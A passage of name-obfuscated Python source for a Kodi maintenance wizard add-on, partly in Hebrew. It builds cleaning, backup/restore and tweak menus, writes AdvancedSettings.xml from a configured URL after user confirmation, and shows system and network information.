	else :O00OOOO00OOO0O000 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:3179
	OO0OOOOO0O0OO00O0 =int (O00O000O0OOOOO0O0 )+int (O00OOOO00OOO0O000 )#line:3180
	O00000000OOOOOOO0 =str (OO0OOOOO0O0OO00O0 )+' Error(s) Found'if OO0OOOOO0O0OO00O0 >0 else 'None Found'#line:3181
	O0O0OO0OO0OO0OO00 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:3182
	if O0OOOOOO000O0O000 =='true':#line:3183
		OOO00O0000O0OO00O ='true'#line:3184
		OOOO0OOO0O0O0O000 ='true'#line:3185
		O00OOO00OOO0O0O00 ='true'#line:3186
		OOOO0O00O00O000OO ='true'#line:3187
		O000O0O00OO0OO0OO ='true'#line:3188
		OOO00O00000O000O0 ='true'#line:3189
		O00O0OO00OOOO0000 ='true'#line:3190
		O0OO00O00O0OO0OOO ='true'#line:3191
	else :#line:3192
		OOO00O0000O0OO00O ='true'if INCLUDEBOB =='true'else 'false'#line:3193
		OOOO0OOO0O0O0O000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:3194
		O00OOO00OOO0O0O00 ='true'if INCLUDESPECTO =='true'else 'false'#line:3195
		OOOO0O00O00O000OO ='true'if INCLUDEGENESIS =='true'else 'false'#line:3196
		O000O0O00OO0OO0OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:3197
		OOO00O00000O000O0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:3198
		O00O0OO00OOOO0000 ='true'if INCLUDESALTS =='true'else 'false'#line:3199
		O0OO00O00O0OO0OOO ='true'if INCLUDESALTSHD =='true'else 'false'#line:3200
	O0OOO00O00000O00O =wiz .getSize (PACKAGES )#line:3201
	OOOOOO00OOOOOOOO0 =wiz .getSize (THUMBS )#line:3202
	O0000O000OOOOOOO0 =wiz .getCacheSize ()#line:3203
	O0O0OO000OOO0000O =O0OOO00O00000O00O +OOOOOO00OOOOOOOO0 +O0000O000OOOOOOO0 #line:3204
	OOOOO0O0OOO0OOOO0 =['Daily','Always','3 Days','Weekly']#line:3205
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:3206
	if view =="clean"or SHOWMAINT =='true':#line:3207
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0OO000OOO0000O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:3208
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0000O000OOOOOOO0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3209
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOO00O00000O00O ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3210
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOOO00OOOOOOOO0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:3211
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3212
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:3213
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:3214
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:3215
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:3216
	if view =="addon"or SHOWMAINT =='false':#line:3217
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3218
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:3219
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3220
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:3221
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3222
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3223
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3224
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:3225
	if view =="misc"or SHOWMAINT =='true':#line:3226
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:3227
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:3228
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:3229
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:3230
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:3231
		addFile ('View Errors in Log: %s'%(O00000000OOOOOOO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:3232
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:3233
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3234
		addFile ('Clear Wizard Log File%s'%O0O0OO0OO0OO0OO00 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3235
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:3236
	if view =="backup"or SHOWMAINT =='true':#line:3237
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3238
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3239
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3240
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:3241
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3242
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3243
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3244
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:3245
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3246
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:3247
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:3248
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3249
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:3250
	if view =="tweaks"or SHOWMAINT =='true':#line:3251
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:3252
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:3253
		else :#line:3254
			if os .path .exists (ADVANCED ):#line:3255
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3256
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3257
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3258
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:3259
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:3260
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3261
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:3262
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:3263
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:3264
	addFile ('Show All Maintenance: %s'%OOO000O000O0O0OOO .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:3265
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:3266
	addFile ('Third Party Wizards: %s'%O0OOOO0O0O0O00000 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3267
	if O0OOOO0O0O0O00000 =='true':#line:3268
		OO0OOO000O0O0O000 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:3269
		O00O000000O00OO0O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:3270
		O0000O0O0000000O0 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:3271
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0OOO000O0O0O000 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:3272
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O000000O00OO0O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:3273
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0000O0O0000000O0 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:3274
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3275
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0OO000O0O0OOO0OO .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:3276
	if O0OO000O0O0OOO0OO =='true':#line:3277
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOOO0O0OOO0OOOO0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:3278
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0000OOO0O00O0000 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3279
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O000O000O000OOO00 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3280
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O0OOOOOOO0O0O00 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3281
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3282
	addFile ('Include Video Cache in Clear Cache: %s'%OOOOOOO0OO0OOO0O0 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:3283
	if OOOOOOO0OO0OOO0O0 =='true':#line:3284
		addFile ('--- Include All Video Addons: %s'%O0OOOOOO000O0O000 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:3285
		addFile ('--- Include Bob: %s'%OOO00O0000O0OO00O .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:3286
		addFile ('--- Include Phoenix: %s'%OOOO0OOO0O0O0O000 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:3287
		addFile ('--- Include Specto: %s'%O00OOO00OOO0O0O00 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:3288
		addFile ('--- Include Exodus: %s'%O000O0O00OO0OO0OO .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:3289
		addFile ('--- Include Salts: %s'%O00O0OO00OOOO0000 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:3290
		addFile ('--- Include Salts HD Lite: %s'%O0OO00O00O0OO0OOO .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:3291
		addFile ('--- Include One Channel: %s'%OOO00O00000O000O0 .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:3292
		addFile ('--- Include Genesis: %s'%OOOO0O00O00O000OO .replace ('true',O0O0OOOOO00000OO0 ).replace ('false',OOOO0O0O00OO0OOOO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:3293
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:3294
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:3295
	setView ('files','viewType')#line:3296
def advancedWindow (url =None ):#line:3298
	if not ADVANCEDFILE =='http://':#line:3299
		if url ==None :#line:3300
			OO0OO00O0000OO0OO =wiz .workingURL (ADVANCEDFILE )#line:3301
			O00OO00O0O0000OOO =uservar .ADVANCEDFILE #line:3302
		else :#line:3303
			OO0OO00O0000OO0OO =wiz .workingURL (url )#line:3304
			O00OO00O0O0000OOO =url #line:3305
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3306
		if os .path .exists (ADVANCED ):#line:3307
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3308
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3309
		if OO0OO00O0000OO0OO ==True :#line:3310
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:3311
			OO0O00O00O0000OOO =wiz .openURL (O00OO00O0O0000OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3312
			O0O00000O0000000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O00O00O0000OOO )#line:3313
			if len (O0O00000O0000000O )>0 :#line:3314
				for O00OOO0O0OOO00OO0 ,O00OOO0O0OO000O00 ,url ,OO00OOOOO00OO00O0 ,OO0000OO0OO0O0OOO ,OOO000O00O0O00OOO in O0O00000O0000000O :#line:3315
					if O00OOO0O0OO000O00 .lower ()=="yes":#line:3316
						addDir ("[B]%s[/B]"%O00OOO0O0OOO00OO0 ,'advancedsetting',url ,description =OOO000O00O0O00OOO ,icon =OO00OOOOO00OO00O0 ,fanart =OO0000OO0OO0O0OOO ,themeit =THEME3 )#line:3317
					else :#line:3318
						addFile (O00OOO0O0OOO00OO0 ,'writeadvanced',O00OOO0O0OOO00OO0 ,url ,description =OOO000O00O0O00OOO ,icon =OO00OOOOO00OO00O0 ,fanart =OO0000OO0OO0O0OOO ,themeit =THEME2 )#line:3319
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:3320
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0OO00O0000OO0OO )#line:3321
	else :wiz .log ("[Advanced Settings] not Enabled")#line:3322
def writeAdvanced (OO00000O0OOO00OO0 ,O000O000OO000OOOO ):#line:3324
	O00OOOOO0OO0OO0OO =wiz .workingURL (O000O000OO000OOOO )#line:3325
	if O00OOOOO0OO0OO0OO ==True :#line:3326
		if os .path .exists (ADVANCED ):O0OOOOOOOO00O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00000O0OOO00OO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:3327
		else :O0OOOOOOOO00O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00000O0OOO00OO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3328
		if O0OOOOOOOO00O0O0O ==1 :#line:3330
			OOO00OO0OO00O0O0O =wiz .openURL (O000O000OO000OOOO )#line:3331
			O00OO00OO0O00O000 =open (ADVANCED ,'w');#line:3332
			O00OO00OO0O00O000 .write (OOO00OO0OO00O0O0O )#line:3333
			O00OO00OO0O00O000 .close ()#line:3334
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:3335
			wiz .killxbmc (True )#line:3336
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:3337
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O00OOOOO0OO0OO0OO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:3338
def viewAdvanced ():#line:3340
	OO0OO00OOO00OOO00 =open (ADVANCED )#line:3341
	O00000O000OO0OOOO =OO0OO00OOO00OOO00 .read ().replace ('\t','    ')#line:3342
	wiz .TextBox (ADDONTITLE ,O00000O000OO0OOOO )#line:3343
	OO0OO00OOO00OOO00 .close ()#line:3344
def removeAdvanced ():#line:3346
	if os .path .exists (ADVANCED ):#line:3347
		wiz .removeFile (ADVANCED )#line:3348
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:3349
def showAutoAdvanced ():#line:3351
	notify .autoConfig ()#line:3352
def getIP ():#line:3354
	OOOOO0O0O0000000O ='http://whatismyipaddress.com/'#line:3355
	if not wiz .workingURL (OOOOO0O0O0000000O ):return 'Unknown','Unknown','Unknown'#line:3356
	O0OO0OO0000OO000O =wiz .openURL (OOOOO0O0O0000000O ).replace ('\n','').replace ('\r','')#line:3357
	if not 'Access Denied'in O0OO0OO0000OO000O :#line:3358
		O00O0000O0O0OO000 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0OO0OO0000OO000O )#line:3359
		OOOO0000OO000OO0O =O00O0000O0O0OO000 [0 ]if (len (O00O0000O0O0OO000 )>0 )else 'Unknown'#line:3360
		O0000OOO0OO000O00 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0OO0OO0000OO000O )#line:3361
		OO0000O00O0OO000O =O0000OOO0OO000O00 [0 ]if (len (O0000OOO0OO000O00 )>0 )else 'Unknown'#line:3362
		O00O000O00O00OOO0 =O0000OOO0OO000O00 [1 ]+', '+O0000OOO0OO000O00 [2 ]+', '+O0000OOO0OO000O00 [3 ]if (len (O0000OOO0OO000O00 )>2 )else 'Unknown'#line:3363
		return OOOO0000OO000OO0O ,OO0000O00O0OO000O ,O00O000O00O00OOO0 #line:3364
	else :return 'Unknown','Unknown','Unknown'#line:3365
def systemInfo ():#line:3367
	OOOO00OO0O00O0OOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3381
	OO000O000OOO0O00O =[];O0O00OOO0O0O0OOO0 =0 #line:3382
	for O000O0O00000OO00O in OOOO00OO0O00O0OOO :#line:3383
		O0OOO00O0000O00OO =wiz .getInfo (O000O0O00000OO00O )#line:3384
		OO0OOOO000OOOOO00 =0 #line:3385
		while O0OOO00O0000O00OO =="Busy"and OO0OOOO000OOOOO00 <10 :#line:3386
			O0OOO00O0000O00OO =wiz .getInfo (O000O0O00000OO00O );OO0OOOO000OOOOO00 +=1 ;wiz .log ("%s sleep %s"%(O000O0O00000OO00O ,str (OO0OOOO000OOOOO00 )));xbmc .sleep (1000 )#line:3387
		OO000O000OOO0O00O .append (O0OOO00O0000O00OO )#line:3388
		O0O00OOO0O0O0OOO0 +=1 #line:3389
	OOO0000000O000O00 =OO000O000OOO0O00O [8 ]if 'Una'in OO000O000OOO0O00O [8 ]else wiz .convertSize (int (float (OO000O000OOO0O00O [8 ][:-8 ]))*1024 *1024 )#line:3390
	O00O0000O00O0000O =OO000O000OOO0O00O [9 ]if 'Una'in OO000O000OOO0O00O [9 ]else wiz .convertSize (int (float (OO000O000OOO0O00O [9 ][:-8 ]))*1024 *1024 )#line:3391
	OO00O0O0O00O0O00O =OO000O000OOO0O00O [10 ]if 'Una'in OO000O000OOO0O00O [10 ]else wiz .convertSize (int (float (OO000O000OOO0O00O [10 ][:-8 ]))*1024 *1024 )#line:3392
	O0000OOOOOOO00OO0 =wiz .convertSize (int (float (OO000O000OOO0O00O [11 ][:-2 ]))*1024 *1024 )#line:3393
	OO0OOOO0OOOO0OOO0 =wiz .convertSize (int (float (OO000O000OOO0O00O [12 ][:-2 ]))*1024 *1024 )#line:3394
	O0OO00OO00O00OO00 =wiz .convertSize (int (float (OO000O000OOO0O00O [13 ][:-2 ]))*1024 *1024 )#line:3395
	O00O000O0OOOOOOO0 ,O00OOOOO00000OO00 ,O0OO00000O00OO000 =getIP ()#line:3396
	OO0000O0O0OOOO000 =[];OO0000O000O000000 =[];O0O0O00OO000O00O0 =[];OOOO00O00O00OO00O =[];O0OO0O00O0000OO00 =[];OOOO0OOO000OO0OO0 =[];OOOO0OOO00O0OO0OO =[]#line:3398
	O000OOO000OO00OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3400
	for O0OOO0000OOO00OOO in sorted (O000OOO000OO00OO0 ,key =lambda OO0OOOOOO00OO00OO :OO0OOOOOO00OO00OO ):#line:3401
		O0OOOO0OO00OOOO0O =os .path .split (O0OOO0000OOO00OOO [:-1 ])[1 ]#line:3402
		if O0OOOO0OO00OOOO0O =='packages':continue #line:3403
		O000O00O0O0OOO00O =os .path .join (O0OOO0000OOO00OOO ,'addon.xml')#line:3404
		if os .path .exists (O000O00O0O0OOO00O ):#line:3405
			OO0OOOOOOO0OOO0O0 =open (O000O00O0O0OOO00O )#line:3406
			OOOOOOOO0O00OO00O =OO0OOOOOOO0OOO0O0 .read ()#line:3407
			OOOO0O0000O0O000O =re .compile ("<provides>(.+?)</provides>").findall (OOOOOOOO0O00OO00O )#line:3408
			if len (OOOO0O0000O0O000O )==0 :#line:3409
				if O0OOOO0OO00OOOO0O .startswith ('skin'):OOOO0OOO00O0OO0OO .append (O0OOOO0OO00OOOO0O )#line:3410
				if O0OOOO0OO00OOOO0O .startswith ('repo'):O0OO0O00O0000OO00 .append (O0OOOO0OO00OOOO0O )#line:3411
				else :OOOO0OOO000OO0OO0 .append (O0OOOO0OO00OOOO0O )#line:3412
			elif not (OOOO0O0000O0O000O [0 ]).find ('executable')==-1 :OOOO00O00O00OO00O .append (O0OOOO0OO00OOOO0O )#line:3413
			elif not (OOOO0O0000O0O000O [0 ]).find ('video')==-1 :O0O0O00OO000O00O0 .append (O0OOOO0OO00OOOO0O )#line:3414
			elif not (OOOO0O0000O0O000O [0 ]).find ('audio')==-1 :OO0000O000O000000 .append (O0OOOO0OO00OOOO0O )#line:3415
			elif not (OOOO0O0000O0O000O [0 ]).find ('image')==-1 :OO0000O0O0OOOO000 .append (O0OOOO0OO00OOOO0O )#line:3416
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3418
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOO0O00O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3419
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOO0O00O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3420
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3421
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOO0O00O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3422
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOO0O00O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3423
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3425
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOO0O00O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3426
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOO0O00O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3427
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3429
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0000000O000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3430
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0000O00O0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3431
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0O0O00O0O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3432
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3434
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OOOOOOO00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3435
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0OOOO0OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3436
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00OO00O00OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3437
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3439
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOO0O00O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3440
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O000O0OOOOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3441
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOO00000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3442
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00000O00OO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3443
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O000OOO0O00O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3444
	OO0OO0000O0OO000O =len (OO0000O0O0OOOO000 )+len (OO0000O000O000000 )+len (O0O0O00OO000O00O0 )+len (OOOO00O00O00OO00O )+len (OOOO0OOO000OO0OO0 )+len (OOOO0OOO00O0OO0OO )+len (O0OO0O00O0000OO00 )#line:3446
